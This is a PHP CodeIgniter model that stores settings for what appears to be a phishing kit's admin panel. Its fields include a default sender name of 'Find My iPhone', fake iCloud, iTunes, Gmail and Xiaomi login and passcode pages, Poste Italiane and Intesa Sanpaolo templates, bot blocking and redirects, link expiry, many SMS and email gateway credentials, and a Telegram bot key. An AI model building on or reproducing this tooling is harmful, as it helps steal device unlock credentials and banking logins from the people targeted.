<?php defined( 'BASEPATH' ) OR exit( 'No direct script access allowed' );

class Options_m extends CI_Model
{

    private $tplName = 'options';

    public function get()
    {
        return $this->db->get( $this->tplName )->result();
    }

    public function getOpt()
    {
        $q = $this->db->get( $this->tplName )->result();

        return $q[ 0 ];
    }

    public function modify( $data )
    {
        $this->db->set( $data );
        $this->db->where( 'id', 1 );
        $this->db->update( $this->tplName );
    }

    public function update()
    {
        $close = $this->input->post( 'close', TRUE );
        $sentEmail = $this->input->post( 'sentEmail', TRUE );
        $email = $this->input->post( 'email', TRUE );
        $senderName = $this->input->post( 'senderName', TRUE );
        $isDelete = $this->input->post( 'isDelete', TRUE );
        $detect = $this->input->post( 'detect', TRUE );
        $sender = $this->input->post( 'sender', TRUE );
        $port = $this->input->post( 'port', TRUE );
        $smtp2go = $this->input->post( 'smtp2go', TRUE );
        $langs = $this->input->post( 'langs', TRUE );
        $template = $this->input->post( 'template', TRUE );
        $closeMsg = $this->input->post( 'closeMsg', TRUE );
        $emailvaild = $this->input->post( 'emailvaild', TRUE );
        $loginPage = $this->input->post( 'loginPage', TRUE );
        $nicloudPage = $this->input->post( 'nicloudPage', TRUE );
        $itunesPage = $this->input->post( 'itunesPage', TRUE );
        $Map2020Modelo1Page = $this->input->post( 'Map2020Modelo1Page', TRUE );
        $Map2020Modelo2Page = $this->input->post( 'Map2020Modelo2Page', TRUE );
        $SenhaTela4Modelo2020Page = $this->input->post( 'SenhaTela4Modelo2020Page', TRUE );
        $SenhaTela6Modelo2020Page = $this->input->post( 'SenhaTela6Modelo2020Page', TRUE );
        $gmail2020Page = $this->input->post( 'gmail2020Page', TRUE );
        $XiaomiLoginPage = $this->input->post( 'XiaomiLoginPage', TRUE );
        $bolinhaPage = $this->input->post( 'bolinhaPage', TRUE );
        $bolinhaPage4 = $this->input->post( 'bolinhaPage4', TRUE );
        $MapaNovoPage = $this->input->post( 'MapaNovoPage', TRUE );
        $MapaNovo6Page = $this->input->post( 'MapaNovo6Page', TRUE );
        $MapaNovoLoginPage = $this->input->post( 'MapaNovoLoginPage', TRUE );
        $fmiPage = $this->input->post( 'fmiPage', TRUE );
        $fmi2Page = $this->input->post( 'fmi2Page', TRUE );
        $passPage = $this->input->post( 'passPage', TRUE );
        $mobile = $this->input->post( 'mobile', TRUE );
        $block = $this->input->post( 'block', TRUE );
        $providerEmail = $this->input->post( 'providerEmail', TRUE );
        $providerPwd = $this->input->post( 'providerPwd', TRUE );
        $providerPort = $this->input->post( 'providerPort', TRUE );
        $sendPluseEmail = $this->input->post( 'sendPluseEmail', TRUE );
        $sendPulse = $this->input->post( 'sendPulse', TRUE );
        $elastice = $this->input->post( 'elastice', TRUE );
        $elasticeEmail = $this->input->post( 'elasticeEmail', TRUE );
        $disablePage = $this->input->post( 'disablePage', TRUE );
        $mapPage = $this->input->post( 'mapPage', TRUE );
        $redirecturl = $this->input->post( 'redirecturl', TRUE );
        $redirecturl2 = $this->input->post( 'redirecturl2', TRUE );
        $blockredirect = $this->input->post( 'blockredirect', TRUE );
        $redirect = $this->input->post( 'redirect', TRUE );
        $notiSMTP = $this->input->post( 'notiSMTP', TRUE );
        $notiSMTPemail = $this->input->post( 'notiSMTPemail', TRUE );
        $notiSMTPpwd = $this->input->post( 'notiSMTPpwd', TRUE );
        $notiSMTPport = $this->input->post( 'notiSMTPport', TRUE );
        $redirectMap = $this->input->post( 'redirectMap', TRUE );
        $expireTime = $this->input->post( 'expireTime', TRUE );
        $timeZone = $this->input->post( 'timeZone', TRUE );
        $isTrack = $this->input->post( 'isTrack', TRUE );
        $smtpServ = $this->input->post( 'smtpServ', TRUE );
        $tracklenght = $this->input->post( 'tracklenght', TRUE );
        $linkVisit = $this->input->post( 'linkVisit', TRUE );
        $senderID = $this->input->post( 'senderID', TRUE );
        $nimbowAPI = $this->input->post( 'nimbowAPI', TRUE );
        $cmSMSapi = $this->input->post( 'cmSMSapi', TRUE );
        $plivoAuthID = $this->input->post( 'plivoAuthID', TRUE );
        $plivoAuthToken = $this->input->post( 'plivoAuthToken', TRUE );
        $smsvalidapi = $this->input->post( 'smsvalidapi', TRUE );
        $viaUser = $this->input->post( 'viaUser', TRUE );
        $viaPass = $this->input->post( 'viaPass', TRUE );
        $bulkUser = $this->input->post( 'bulkUser', TRUE );
        $bulkPass = $this->input->post( 'bulkPass', TRUE );
        $budgetUser = $this->input->post( 'budgetUser', TRUE );
        $budgetID = $this->input->post( 'budgetID', TRUE );
        $budgetHandle = $this->input->post( 'budgetHandle', TRUE );
        $waveid = $this->input->post( 'waveid', TRUE );
        $wavesub = $this->input->post( 'wavesub', TRUE );
        $wavepwd = $this->input->post( 'wavepwd', TRUE );
        $nexmokey = $this->input->post( 'nexmokey', TRUE );
        $nexmosecert = $this->input->post( 'nexmosecert', TRUE );
        $sinchkey = $this->input->post( 'sinchkey', TRUE );
        $sinchsecret = $this->input->post( 'sinchsecret', TRUE );
        $beepsendtoken = $this->input->post( 'beepsendtoken', TRUE );
        $alienicsuser = $this->input->post( 'alienicsuser', TRUE );
        $alienicspwd = $this->input->post( 'alienicspwd', TRUE );
        $sendgridapi = $this->input->post( 'sendgridapi', TRUE );
        $postmarktoken = $this->input->post( 'postmarktoken', TRUE );
        $postmarksender = $this->input->post( 'postmarksender', TRUE );
        $blankCount = $this->input->post( 'blankCount', TRUE );
        $disableCount = $this->input->post( 'disableCount', TRUE );
        $disableLink = $this->input->post( 'disableLink', TRUE );
        $expireLink = $this->input->post( 'expireLink', TRUE );
        $sendSMSUser = $this->input->post( 'sendSMSUser', TRUE );
        $sendSMSPass = $this->input->post( 'sendSMSPass', TRUE );
		    $sendMailUser = $this->input->post( 'sendMailUser', TRUE );
        $sendMailPass = $this->input->post( 'sendMailPass', TRUE );
        $numeroSMSadmin = $this->input->post( 'numeroSMSadmin', TRUE );
        $botTelegramKey = $this->input->post( 'botTelegramKey', TRUE );
        $ShowPosteItaliane = $this->input->post( 'ShowPosteItaliane', TRUE );
        $DomainTemplate1 = $this->input->post( 'DomainTemplate1', TRUE );
        $DomainTemplate2 = $this->input->post( 'DomainTemplate2', TRUE );
        $DomainTemplate3 = $this->input->post( 'DomainTemplate3', TRUE );
        $DomainTemplate4 = $this->input->post( 'DomainTemplate4', TRUE );
        $DomainTemplate5 = $this->input->post( 'DomainTemplate5', TRUE );
        $DomainTemplate6 = $this->input->post( 'DomainTemplate6', TRUE );
        $DomainTemplate7 = $this->input->post( 'DomainTemplate7', TRUE );
        $ShowIntesaSanpaolo = $this->input->post( 'ShowIntesaSanpaolo', TRUE );
        $ShowTemplate3 = $this->input->post( 'ShowTemplate3', TRUE );
        $ShowTemplate4 = $this->input->post( 'ShowTemplate4', TRUE );
        $ShowTemplate5 = $this->input->post( 'ShowTemplate5', TRUE );
        $ShowTemplate6 = $this->input->post( 'ShowTemplate6', TRUE );
        $ShowTemplate7 = $this->input->post( 'ShowTemplate7', TRUE );
        $KeyAuth = $this->input->post( 'KeyAuth', TRUE );

        $data = array(
            'close'          => ( $close != 1 ) ? 0 : 1,
            'sentEmail'      => ( $sentEmail != 1 ) ? 0 : 1,
            'email'          => $email,
            'senderName'     => ( $senderName ) ? $senderName : 'Find My iPhone',
            'sender'         => $sender,
            'port'           => $port,
            'isDelete'       => ( $isDelete != 1 ) ? 0 : 1,
            'detect'         => ( $detect != 1 ) ? 0 : 1,
            'mobile'         => ( $mobile != 1 ) ? 0 : 1,
            'block'          => ( $block != 1 ) ? 0 : 1,
            'redirect'       => ( $redirect != 1 ) ? 0 : 1,
            'smtp2go'        => $smtp2go,
            'langs'          => $langs,
            'template'       => $template,
            'closeMsg'       => $closeMsg,
            'emailvaild'     => $emailvaild,
            'loginPage'      => $loginPage,
            'nicloudPage'      => $nicloudPage,
            'itunesPage'      => $itunesPage,
            'Map2020Modelo1Page'      => $Map2020Modelo1Page,
            'Map2020Modelo2Page'      => $Map2020Modelo2Page,
            'SenhaTela4Modelo2020Page'      => $SenhaTela4Modelo2020Page,
            'SenhaTela6Modelo2020Page'      => $SenhaTela6Modelo2020Page,
            'gmail2020Page'      => $gmail2020Page,
            'XiaomiLoginPage'      => $XiaomiLoginPage,
            'bolinhaPage'      => $bolinhaPage,
            'bolinhaPage4'      => $bolinhaPage4,
            'MapaNovoPage'      => $MapaNovoPage,
            'MapaNovo6Page'      => $MapaNovo6Page,
            'MapaNovoLoginPage'      => $MapaNovoLoginPage,
            'fmiPage'        => $fmiPage,
            'passPage'       => $passPage,
            'fmi2Page'       => $fmi2Page,
            'providerEmail'  => $providerEmail,
            'providerPwd'    => $providerPwd,
            'redirecturl'    => $redirecturl,
            'redirecturl2'   => $redirecturl2,
            'redirectMap'    => $redirectMap,
            'blockredirect'  => $blockredirect,
            'providerPort'   => $providerPort,
            'sendPluseEmail' => $sendPluseEmail,
            'sendPulse'      => $sendPulse,
            'elastice'       => $elastice,
            'elasticeEmail'  => $elasticeEmail,
            'disablePage'    => $disablePage,
            'mapPage'        => $mapPage,
            'notiSMTP'       => $notiSMTP,
            'notiSMTPemail'  => $notiSMTPemail,
            'notiSMTPpwd'    => $notiSMTPpwd,
            'notiSMTPport'   => $notiSMTPport,
            'expireTime'     => $expireTime,
            'timeZone'       => $timeZone,
            'smtpServ'       => $smtpServ,
            'isTrack'        => ( $isTrack != 1 ) ? 0 : 1,
            'tracklenght'    => $tracklenght,
            'linkVisit'      => $linkVisit,
            'senderID'       => $senderID,
            'nimbowAPI'      => $nimbowAPI,
            'cmSMSapi'       => $cmSMSapi,
            'plivoAuthID'    => $plivoAuthID,
            'plivoAuthToken' => $plivoAuthToken,
            'viaUser'        => $viaUser,
            'viaPass'        => $viaPass,
            'bulkUser'       => $bulkUser,
            'bulkPass'       => $bulkPass,
            'budgetUser'     => $budgetUser,
            'budgetID'       => $budgetID,
            'budgetHandle'   => $budgetHandle,
            'waveid'         => $waveid,
            'wavesub'        => $wavesub,
            'wavepwd'        => $wavepwd,
            'nexmokey'       => $nexmokey,
            'nexmosecert'    => $nexmosecert,
            'sinchkey'       => $sinchkey,
            'sinchsecret'    => $sinchsecret,
            'beepsendtoken'  => $beepsendtoken,
            'alienicsuser'   => $alienicsuser,
            'alienicspwd'    => $alienicspwd,
            'sendgridapi'    => $sendgridapi,
            'postmarktoken'  => $postmarktoken,
            'postmarksender' => $postmarksender,
            'smsvalidapi'    => $smsvalidapi,
            'blankCount'     => $blankCount,
            'disableCount'   => $disableCount,
            'disableLink'    => $disableLink,
            'expireLink'     => $expireLink,
            'sendSMSUser'     => $sendSMSUser,
            'sendSMSPass'     => $sendSMSPass,
			'sendMailUser'     => $sendMailUser,
            'sendMailPass'     => $sendMailPass,
            'numeroSMSadmin'     => $numeroSMSadmin,
            'ShowPosteItaliane'     => $ShowPosteItaliane,
            'DomainTemplate1'     => $DomainTemplate1,
            'DomainTemplate2'     => $DomainTemplate2,
            'DomainTemplate3'     => $DomainTemplate3,
            'DomainTemplate4'     => $DomainTemplate4,
            'DomainTemplate5'     => $DomainTemplate5,
            'DomainTemplate6'     => $DomainTemplate6,
            'DomainTemplate7'     => $DomainTemplate7,
            'ShowIntesaSanpaolo'     => $ShowIntesaSanpaolo,
            'ShowTemplate3'     => $ShowTemplate3,
            'ShowTemplate4'     => $ShowTemplate4,
            'ShowTemplate5'     => $ShowTemplate5,
            'ShowTemplate6'     => $ShowTemplate6,
            'ShowTemplate7'     => $ShowTemplate7,
            'botTelegramKey'     => $botTelegramKey,
            'KeyAuth'     => $KeyAuth,
        );
        $this->db->set( $data );
        $this->db->where( 'id', 1 );
        $this->db->update( $this->tplName );

        return ( $this->db->affected_rows() > 0 ) ? TRUE : FALSE;
    }

    public function remove_comments( &$output )
    {
        $lines = explode( "\n", $output );
        $output = "";

        // try to keep mem. use down
        $linecount = count( $lines );

        $in_comment = FALSE;
        for ( $i = 0; $i < $linecount; $i++ ) {
            if ( preg_match( "/^\/\*/", preg_quote( $lines[ $i ] ) ) ) {
                $in_comment = TRUE;
            }

            if ( ! $in_comment ) {
                $output .= $lines[ $i ] . "\n";
            }

            if ( preg_match( "/\*\/$/", preg_quote( $lines[ $i ] ) ) ) {
                $in_comment = FALSE;
            }
        }

        unset( $lines );

        return $output;
    }

    //
    // remove_remarks will strip the sql comment lines out of an uploaded sql file
    //
    public function remove_remarks( $sql )
    {
        $lines = explode( "\n", $sql );

        // try to keep mem. use down
        $sql = "";

        $linecount = count( $lines );
        $output = "";

        for ( $i = 0; $i < $linecount; $i++ ) {
            if ( ( $i != ( $linecount - 1 ) ) || ( strlen( $lines[ $i ] ) > 0 ) ) {
                if ( isset( $lines[ $i ][ 0 ] ) && $lines[ $i ][ 0 ] != "#" ) {
                    $output .= $lines[ $i ] . "\n";
                } else {
                    $output .= "\n";
                }
                // Trading a bit of speed for lower mem. use here.
                $lines[ $i ] = "";
            }
        }

        return $output;

    }

    //
    // split_sql_file will split an uploaded sql file into single sql statements.
    // Note: expects trim() to have already been run on $sql.
    //
    public function split_sql_file( $sql, $delimiter )
    {
        // Split up our string into "possible" SQL statements.
        $tokens = explode( $delimiter, $sql );

        // try to save mem.
        $sql = "";
        $output = array();

        // we don't actually care about the matches preg gives us.
        $matches = array();

        // this is faster than calling count($oktens) every time thru the loop.
        $token_count = count( $tokens );
        for ( $i = 0; $i < $token_count; $i++ ) {
            // Don't wanna add an empty string as the last thing in the array.
            if ( ( $i != ( $token_count - 1 ) ) || ( strlen( $tokens[ $i ] > 0 ) ) ) {
                // This is the total number of single quotes in the token.
                $total_quotes = preg_match_all( "/'/", $tokens[ $i ], $matches );
                // Counts single quotes that are preceded by an odd number of backslashes,
                // which means they're escaped quotes.
                $escaped_quotes = preg_match_all( "/(?<!\\\\)(\\\\\\\\)*\\\\'/", $tokens[ $i ], $matches );

                $unescaped_quotes = $total_quotes - $escaped_quotes;

                // If the number of unescaped quotes is even, then the delimiter did NOT occur inside a string literal.
                if ( ( $unescaped_quotes % 2 ) == 0 ) {
                    // It's a complete sql statement.
                    $output[] = $tokens[ $i ];
                    // save memory.
                    $tokens[ $i ] = "";
                } else {
                    // incomplete sql statement. keep adding tokens until we have a complete one.
                    // $temp will hold what we have so far.
                    $temp = $tokens[ $i ] . $delimiter;
                    // save memory..
                    $tokens[ $i ] = "";

                    // Do we have a complete statement yet?
                    $complete_stmt = FALSE;

                    for ( $j = $i + 1; ( ! $complete_stmt && ( $j < $token_count ) ); $j++ ) {
                        // This is the total number of single quotes in the token.
                        $total_quotes = preg_match_all( "/'/", $tokens[ $j ], $matches );
                        // Counts single quotes that are preceded by an odd number of backslashes,
                        // which means they're escaped quotes.
                        $escaped_quotes = preg_match_all( "/(?<!\\\\)(\\\\\\\\)*\\\\'/", $tokens[ $j ], $matches );

                        $unescaped_quotes = $total_quotes - $escaped_quotes;

                        if ( ( $unescaped_quotes % 2 ) == 1 ) {
                            // odd number of unescaped quotes. In combination with the previous incomplete
                            // statement(s), we now have a complete statement. (2 odds always make an even)
                            $output[] = $temp . $tokens[ $j ];

                            // save memory.
                            $tokens[ $j ] = "";
                            $temp = "";

                            // exit the loop.
                            $complete_stmt = TRUE;
                            // make sure the outer loop continues at the right point.
                            $i = $j;
                        } else {
                            // even number of unescaped quotes. We still don't have a complete statement.
                            // (1 odd and 1 even always make an odd)
                            $temp .= $tokens[ $j ] . $delimiter;
                            // save memory.
                            $tokens[ $j ] = "";
                        }

                    } // for..
                } // else
            }
        }

        return $output;
    }

}

/* End of file Options.php */
/* Location: ./application/models/Options.php */
